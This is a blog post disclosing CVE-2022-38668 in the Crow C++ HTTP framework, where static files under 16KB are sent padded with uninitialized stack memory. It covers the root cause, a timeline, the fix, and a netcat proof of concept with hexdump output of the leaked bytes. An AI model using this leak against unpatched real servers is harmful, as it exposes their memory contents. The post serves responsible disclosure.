<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Crowbleed (Crow HTTP framework vulnerability) - gynvael.coldwind//vx.log</title>
<meta property="og:title" content="Crowbleed (Crow HTTP framework vulnerability)" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link type="text/css" href="/style.css" rel="stylesheet"/>
<link type="text/css" href="/inpost.css" rel="stylesheet"/>
<link rel="shortcut icon" href="https://gynvael.coldwind.pl/fav.ico"/>
<link rel="alternate" type="application/rss+xml" href="rss_pl.php" title="gynvael.coldwind//vx.log (PL)" />
<link rel="alternate" type="application/rss+xml" href="rss_en.php" title="gynvael.coldwind//vx.log (EN)" />
<!--<meta name="viewport" content="width=device-width, initial-scale=1">-->
<meta property="og:image" content="https://gynvael.coldwind.pl/img/gynvael_logo.png" />
<style>
#consulting {
  display: block;
  width: fit-content;
  font-size: 0.8em;
  text-align: center;
  background-color: #2c2c5c;
  color: #a7a7ea;
  padding: 0.7em;
  padding-left: 1em;
  padding-right: 1em;
  clip-path: polygon(
    0 10px,
    10px 0,
    100% 0, 
    100% calc(100% - 10px), 
    calc(100% - 10px) 100%, 
    0 100%, 
    0 10px
 );
  text-decoration: none;
}
#consulting:hover {
  color: #2c2c5c;
  background-color: #a7a7ea;
}

@media (min-width: 1120px) {
  #consulting {
    display: block;
  }
}


#training {
  display: block;
  width: fit-content;
  font-size: 0.8em;
  text-align: center;
  background-color: #2c2c5c;
  color: #a7a7ea;
  padding: 0.7em;
  padding-left: 1em;
  padding-right: 1em;
  clip-path: polygon(
    0 10px,
    10px 0,
    100% 0, 
    100% calc(100% - 10px), 
    calc(100% - 10px) 100%, 
    0 100%, 
    0 10px
 );
  text-decoration: none;
  color: #a7a7ea;
}
#training:hover {
  background-color: #a7a7ea;
  color: #2c2c5c;
}

@media (min-width: 1120px) {
  #training {
    display: block;
  }
}

.top-button-container {
  position: absolute;
  left: 220px;
  top: 120px;
  width: 484px;
  display: flex;
  justify-content: space-evenly;
  align-items: center;

}

</style>
</head>
<body>
<div id="main">
<div id="header" style="position: relative;">
  <h1 id="logo"><a href="/?blog=1"><img src="/img/logo.gif" alt="gynvael.coldwin//vx.log"/></a></h1><img src="/images/something_suspicious.png" style="margin: -34px 74px 0px 0px; padding: 0px;" align="right" alt="" />
  <div class="top-button-container">
  <a id="consulting" href="https://hexarcana.ch/?utm=gyn-blog">Available for Consulting and Projects</a>
  <a id="training" href="https://hexarcana.ch/workshops/?utm=gyn-blog-w">Upcoming Talks</a>
  </div>
</div>

<div id="sidebar"><div class="section"><img src='/img/gynvael-close.jpg' style='margin-left:0.5em' /><br /><ul><li><a href="/">Return to dashboard <big>&#8682;</big></a></li></ul><br /><h3><em>Sections</em></h3>
<ul>
  <li><b>lang</b>: <a href="?blog=1&amp;lang=pl"><img src="/images/lang_pl.png" style="margin: 0" alt="PL" /></a> | <a href="?blog=1&amp;lang=en"><img src="/images/lang_en.png" style="margin: 0" alt="EN" /></a></li>
  <li><b>RSS</b>: <a href="/rss_pl.php"><img src="/images/lang_pl.png" style="margin: 0" alt="RSS PL" /></a> | <a href="/rss_en.php"><img src="/images/lang_en.png" style="margin: 0" alt="RSS EN" /></a></li>
	<li><br /></li>
<li><a href='?id=50'>About me</a></li>
<li><a href='?id=182'>Tools</a></li>
<li><br /></li>
<li><a href='https://youtube.com/c/GynvaelEN'>&rarr; <span style='background-color:#e62218;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>YT</span> YouTube (EN)</a></li>
<li><a href='/discord'>&rarr; <span style='background-color:#7087d8;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>D</span> Discord</a>
<li><a href='https://infosec.exchange/@gynvael'>&rarr; <span style='background-color:#6b65d8;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>M</span> Mastodon</a>
<li><a href='https://twitter.com/gynvael'>&rarr; <span style='background-color:#009def;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>T</span> Twitter</a>
<li><a href='https://github.com/gynvael'>&rarr; <span style='background-color:#282d31;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>GH</span> GitHub</a>
<br />

  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
  <a href='https://hexarcana.ch'><img src='/img/hexarcana160_2.png' style='margin-left: 0;' /></a>
    <br />
    <a href='https://hexarcana.ch'>My company's website</a>
  </div>







  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
    <a href='https://pagedout.institute/'><img src='/img/po_issue_5_rbanner.png' style='margin-left: 0;' /></a>
    <br />
    <a href='https://pagedout.institute/'>Paged Out! zine</a>
  </div>


  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
    <a href='https://dragonsector.pl/'><img src='/img/ds_logo_160.jpg' style='margin-left: 0;' /></a>
    <br />
    <a href='https://dragonsector.pl/'>Dragon Sector CTF Team</a>
  </div>

</ul></div>

		<div class="section"><h3><em>Links / Blogs</em></h3>
	
        <ul>
        <li><a href="http://dragonsector.pl"><big>&rarr;</big> dragonsector.pl</a></li>
        <li><a href="http://vexillium.org"><big>&rarr;</big> vexillium.org</a></li>
      
          <!--<li><a href="http://arashicoldwind.blogspot.com/"><big>&rarr;</big> arashi coldwind blogspot</a></li>-->

          <li><small><b>Security/Hacking:</b></small><ul>
          <li><a href="http://j00ru.vexillium.org/?lang=en">j00ru's blog</a></li>
          <li><a href="http://lcamtuf.blogspot.com/">lcamtuf's blog</a></li>
          <li><a href="http://blog.invisiblethings.org/">invisible things (new)</a></li>
          <li><a href="http://theinvisiblethings.blogspot.com/">invisible things (old)</a></li>
          <li><a href="http://liveoverflow.com/">liveoverflow's site</a></li>
          <li><a href="https://d3vnull.com/">/dev/null's site</a></li>
          <li><a href="http://blog.pi3.com.pl/">pi3's blog</a></li>
          <li><a href="http://icewall.pl/">icewall's blog</a></li>
          <li><a href="http://blog.cmpxchg8b.com/">taviso's blog</a></li>          
          <li><a href="http://wampir.mroczna-zaloga.org/">pawel's blog</a></li>
          <li><a href="http://www.sandeepkamble.com/">sandeep's blog</a></li>
          <li><a href="http://blog.kotowicz.net/">koto's blog</a></li>
          <li><a href="http://128nops.blogspot.ch/">carstein's blog</a></li>
          <li><a href="http://zaufanatrzeciastrona.pl/">zaufana trzecia strona</a></li>
          <li><a href="https://niebezpiecznik.pl/">niebezpiecznik</a></li>
          <li><a href="https://sekurak.pl/">sekurak</a></li>

</ul></li>

          <li><small><b>Reverse Eng./Low-Level:</b></small><ul>
          <li><a href="http://blog.rewolf.pl/blog/">rewolf's blog</a></li>
          <li><a href="http://gdtr.wordpress.com/">gdtr</a></li>
          <li><a href="http://omeg.pl/">spinning mirrors</a></li>
          <li><a href="https://www.secnews.pl/">security news</a></li>
          <li><a href="http://rev3rsed.blogspot.com/">rev3rsed</a></li> <!-- last post: 24.11.2015 -->
</ul></li>

          <li><small><b>Programming/Code:</b></small><ul>
          <li><a href="https://dev.krzaq.cc/">/dev/krzaq</a></li>
          <li><a href="http://sil2100.vexillium.org/">sil2100/vx's web log</a></li>
          <li><a href="http://asawicki.info/">adam sawicki</a></li>
          <li><a href="http://devkk.net/">devkk.net</a></li>
          <li><a href="http://xion.org.pl/">xion.log</a></li>
</ul></li>
                </div>

<div class="section"><h3><em><a href="?">Posts</a></em></h3>
<ul>
<li><small><a href="?id=797"><span class="val">Paged Out! #5 is out</span>,</a></small></li>
<li><small><a href="?id=796"><span class="val">CVEs of SSH talk this Thursday</span>,</a></small></li>
<li><small><a href="?id=793"><span class="val">Debug Log: Internet doesn't work (it was the PSU)</span>,</a></small></li>
<li><small><a href="?id=791"><span class="val">FAQ: The tragedy of low-level exploitation</span>,</a></small></li>
<li><small><a href="?id=789"><span class="val">Solving Hx8 Teaser 2 highlight videos!</span>,</a></small></li>
<li><small><a href="?id=788"><span class="val">Gynvael on SECURITYbreak podcast</span>,</a></small></li>
<li><small><a href="?id=786"><span class="val">Paged Out! #4 is out</span>,</a></small></li>
<li><small><a href="?id=785"><span class="val">I won't be able to attend CONFidence'24 after all :(</span>,</a></small></li>
<li><small><a href="?id=782"><span class="val">xz/liblzma: Bash-stage Obfuscation Explained</span>,</a></small></li>
<li><small><a href="?id=781"><span class="val">Two of my bookmarklets: image extraction and simple TTS</span>,</a></small></li>
<li><a href="/">&rarr; see all posts on main page</a></li>

	<li><br /></li>

      </ul></div>
	
	
	<div id="footer">
          // copyright &copy; Gynvael Coldwind<br/>
          // design &amp; art by Xa<br/>
          // logo font (birdman regular) by utopiafonts / Dale Harris<br/>
        <br/>
        /* the author and owner of this blog hereby allows anyone to test the security of this blog (on HTTP level only, the server is not mine, so let's leave it alone ;&gt;), and try to break in (including successful breaks) without any consequences of any kind (DoS attacks are an exception here) ... I'll add that I planted in some places funny photos of some kittens, there are 7 of them right now, so have fun looking for them ;&gt; let me know if You find them all, I'll add some congratz message or sth ;&gt; */
        <br/><br/>
        <b>Vulns found in blog:</b><br/>
        * XSS <i>(pers, user-inter)</i> by ged_<br/>
        * XSS <i>(non-pers)</i> by Anno &amp; Tracerout<br/>
        * XSS <i>(pers)</i> by Anno &amp; Tracerout<br/>
        * Blind SQLI by Sławomir Błażek<br/>
        * XSS <i>(pers) by </i>Sławomir Błażek<br/>
      </div>
</div><div id="content">
        <div class="title"><div class="inside"><div class="inside2"><div class="date">2022-09-23: </div><h2><a href="?id=752">Crowbleed (Crow HTTP framework vulnerability)</a></h2><div class="tags">vulnerability:crow</div></div></div></div>
        <div class="post"><div class="htmlpost"><img src="img/crowbleed.png" alt="Crow framework logo stylized with bleeding letters." style="margin:0; margin-left:0.5em; margin-bottom:0.5em; max-width: 33%; max-height: auto;" align="right">
<p><b>(Collaborative post by Gynvael Coldwind and <a href="https://github.com/0xhebi/CVEs/blob/main/Crow/CVE-2022-38668.md">hebi</a>)</b></p>

<p>Crow is an asynchronous C++ HTTP/WebSocket framework for creating "flask-like" web services. While analyzing <a href="/?lang=en&id=753">another vulnerability</a> we've found a Cloudbleed-like information disclosure bug in the code path responsible for serving static files. Technically no special action on attacker's side was required - it was enough to request a static file smaller than 16KB and the server would send the file padded with uninitialized stack content (up to 16KB) back.</p>

<p>The vulnerability in question was reported mid-August and fixed within 6 days.</p>

<h4>CVSS, CVE, etc</h4>
<p>Human readable details are in the next section.</p>

<ul>
  <li><b>CVE</b>: CVE-2022-38668</li>
  <li><b>CVSS 3.1</b>: 5.3 Medium (AV:N/AC:L/PR:N/UI:N/S:U/<b>C:L</b>/I:N/A:N) [as originally reported]</li>
  <li><b>CVSS 3.1</b>: 7.5 High   (AV:N/AC:L/PR:N/UI:N/S:U/<b>C:H</b>/I:N/A:N) [as rated by NIST/NVD]</li>
</ul>

<h4>Timeline</h4>
<ul>
  <li>2022-08-14: Vulnerability discovered.</li>
  <li>2022-08-17: Vulnerability reported.</li>
  <li>2022-08-21: Public fix was proposed.</li>
  <li>2022-08-22: Public fix was merged in.</li>
  <li>2022-08-22: CVE requested and assigned.</li>
  <li>2022-09-23: Details were published.</li>
</ul>

<h4>Original report with details</h4>

<code>
*** Summary:

Affected: Crow version 1.0+4 and older
  <a href="https://github.com/CrowCpp/Crow">https://github.com/CrowCpp/Crow</a> - maintained version (fork)
  <a href="https://github.com/ipkn/crow">https://github.com/ipkn/crow</a> - original version

Discovered by:
  Gynvael Coldwind
  hebi

Method of discovery:
  Manual Analysis (reading the code)

"Crow is a C++ framework for creating HTTP or Websocket web services. It uses
routing similar to Python's Flask which makes it easy to use. It is also
extremely fast, beating multiple existing C++ frameworks as well as non C++
frameworks."                                       (source: project's README.md)

Crow versions prior 1.0+4 (included) are vulnerable to an Information Disclosure
("Exposure of Sensitive Information to an Unauthorized Actor") issue, due to
improper handling of static resources.
Any request to a static resource, where the static resource is smaller than
16KB, will lead to disclosing up to 16KB of data from the stack.

IMPORTANT: This vulnerability is reported under the 90-day policy 
(version 2021), i.e. this report will be shared publicly with the defensive
community on 16th November 2022 if a patch/fix is not available by that time, or
30 days after the fix becomes available. For details please see:
<a href="https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html">https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html</a>


*** Vulnerability details and exploit

The vulnerability is located in the Connection::do_write_static* method within 
the http_connection.h file.
* <a href="https://github.com/CrowCpp/Crow/blob/master/include/crow/http_connection.h#L393">https://github.com/CrowCpp/Crow/blob/master/include/crow/http_connection.h#L393</a>

This function creates a local buffer with a fixed size of 16384 bytes. Then the
buffer is passed to is.read() method (where "is" denotes an opened local file
pointed to by the static resource mapping) to acquire the content of the given
static resource (file). This call made within a while loop's condition, which
checks if any data was read (if not, the loop will exit).

However, the number of bytes that were read is not being tracked in any form.
Furthermore, the whole buffer is then passed to asio::buffer without specified
size**.
** In this case it means that the whole array size will be used as data size, as
per the following constructor description:
<a href="https://www.boost.org/doc/libs/1_80_0/doc/html/boost_asio/reference/buffer/overload7.html">https://www.boost.org/doc/libs/1_80_0/doc/html/boost_asio/reference/buffer/overload7.html</a>

This in turn leads to the whole local buffer being sent to the client requesting
the resource, including the potentially uninitialized part. This is especially
true for files smaller than 16KB.

Conditions for triggering this behavior are:

  1. Static path needs to be defined.
  2. At least 1 static file needs to exist.
  3. The file needs to be smaller than 16KB.


*** Exploit

$ cat poc.txt | nc -v 127.0.0.1 18080 | hexdump -C
localhost [127.0.0.1] 18080 (?) open
00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  |HTTP/1.1 200 OK.|
00000010  0a 43 6f 6e 74 65 6e 74  2d 54 79 70 65 3a 20 74  |.Content-Type: t|
00000020  65 78 74 2f 70 6c 61 69  6e 0d 0a 43 6f 6e 74 65  |ext/plain..<b>Conte</b>|
00000030  6e 74 2d 4c 65 6e 67 74  68 3a 20 35 0d 0a 53 65  |<b>nt-Length: 5</b>..Se|
00000040  72 76 65 72 3a 20 43 72  6f 77 2f 6d 61 73 74 65  |rver: Crow/maste|
00000050  72 0d 0a 44 61 74 65 3a  20 54 75 65 2c 20 31 36  |r..Date: Tue, 16|
00000060  20 41 75 67 20 32 30 32  32 20 32 32 3a 34 39 3a  | Aug 2022 22:49:|
00000070  32 32 20 47 4d 54 0d 0a  43 6f 6e 6e 65 63 74 69  |22 GMT..Connecti|
00000080  6f 6e 3a 20 4b 65 65 70  2d 41 6c 69 76 65 0d 0a  |on: Keep-Alive..|
00000090  0d 0a 54 65 73 74 0a 00  00 00 00 00 00 00 00 00  |..<b>Test.</b><span style="color:#ff2222">.........</span>|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |<span style="color:#ff2222">................</span>|
*
00002a90  00 00 00 00 00 00 00 00  00 00 28 14 00 ac d8 7f  |<span style="color:#ff2222">..........(.....</span>|
00002aa0  00 00 20 14 00 ac d8 7f  00 00 48 f8 8c b4 d8 7f  |<span style="color:#ff2222">.. .......H.....</span>|
00002ab0  00 00 50 f8 8c b4 d8 7f  00 00 49 8a 42 00 00 00  |<span style="color:#ff2222">..P.......I.B...</span>|
00002ac0  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |<span style="color:#ff2222">..(....... .....</span>|
00002ad0  00 00 03 00 00 00 00 00  00 00 11 00 00 00 00 00  |<span style="color:#ff2222">................</span>|
00002ae0  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |<span style="color:#ff2222">..(....... .....</span>|
00002af0  00 00 c0 f8 8c b4 d8 7f  00 00 cc 89 42 00 00 00  |<span style="color:#ff2222">............B...</span>|
00002b00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |<span style="color:#ff2222">................</span>|
00002b10  00 00 5b 00 00 00 6e 00  00 00 c0 1c 00 ac d8 7f  |<span style="color:#ff2222">..[...n.........</span>|
00002b20  00 00 b0 1c 00 ac d8 7f  00 00 01 00 00 00 00 00  |<span style="color:#ff2222">................</span>|
00002b30  00 00 20 00 00 00 00 00  00 00 08 00 00 00 00 00  |<span style="color:#ff2222">.. .............</span>|
00002b40  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |<span style="color:#ff2222">..(....... .....</span>|
00002b50  00 00 b0 1c 00 ac d8 7f  00 00 40 f9 8c b4 d8 7f  |<span style="color:#ff2222">..........@.....</span>|
00002b60  00 00 f0 f8 8c b4 d8 7f  00 00 89 48 49 00 00 00  |<span style="color:#ff2222">...........HI...</span>|
00002b70  00 00 28 3b 8d b4 d8 7f  00 00 30 14 00 ac d8 7f  |<span style="color:#ff2222">..(;......0.....</span>|
00002b80  00 00 40 f9 8c b4 d8 7f  00 00 48 f9 8c b4 d8 7f  |<span style="color:#ff2222">..@.......H.....</span>|
00002b90  00 00 50 f9 8c b4 d8 7f  00 00 99 47 49 00 00 00  |<span style="color:#ff2222">..P........GI...</span>|
00002ba0  00 00 01 00 00 00 00 00  00 00 c8 04 8d b4 d8 7f  |<span style="color:#ff2222">................</span>|
00002bb0  00 00 30 f9 8c b4 d8 7f  00 00 b0 1c 00 ac d8 7f  |<span style="color:#ff2222">..0.............</span>|
00002bc0  00 00 01 00 00 00 00 00  00 00 c8 04 8d b4 d8 7f  |<span style="color:#ff2222">................</span>|
00002bd0  00 00 d0 1c 00 ac d8 7f  00 00 b0 1c 00 ac d8 7f  |<span style="color:#ff2222">................</span>|
00002be0  00 00 30 14 00 ac d8 7f  00 00 30 14 00 ac d8 7f  |<span style="color:#ff2222">..0.......0.....</span>|
00002bf0  00 00 90 f9 8c b4 d8 7f  00 00 00 53 2a 66 e1 24  |<span style="color:#ff2222">...........S*f.$</span>|
00002c00  09 b2 30 14 00 ac d8 7f  00 00 60 ff ff ff ff ff  |<span style="color:#ff2222">..0.......`.....</span>|
...

*** Proposed fix:

Passing the actual size of bytes read to asio::buffer's constructor.
</code>

</div>
        <div class="postcomments"></div>
        </div>
<div id="comments"><h2>Add a comment:</h2>

<form action="?id=752" method="POST">
  <table>
    <tr><td>Nick:</td><td style="width: 60%"><input name="nick"/></td></tr>
    <tr><td>URL (optional):</td><td style="width: 60%"><input name="url"/></td></tr>
    <tr><td>Math captcha: 7 &lowast; 9 &#xff0b; 1 = </td><td style="width: 60%"><input name="captcha"/></td></tr>
    <tr><td colspan="2">
        <textarea name="text"></textarea>
  <input type="hidden" name="asdf" value="28866bd66451706de8bc58efda331936"/>
  <input type="submit" class="button" />
</td></tr>
  </table>
</form>
</div></div><div class="clear"></div>
</div>
</body>
</html>
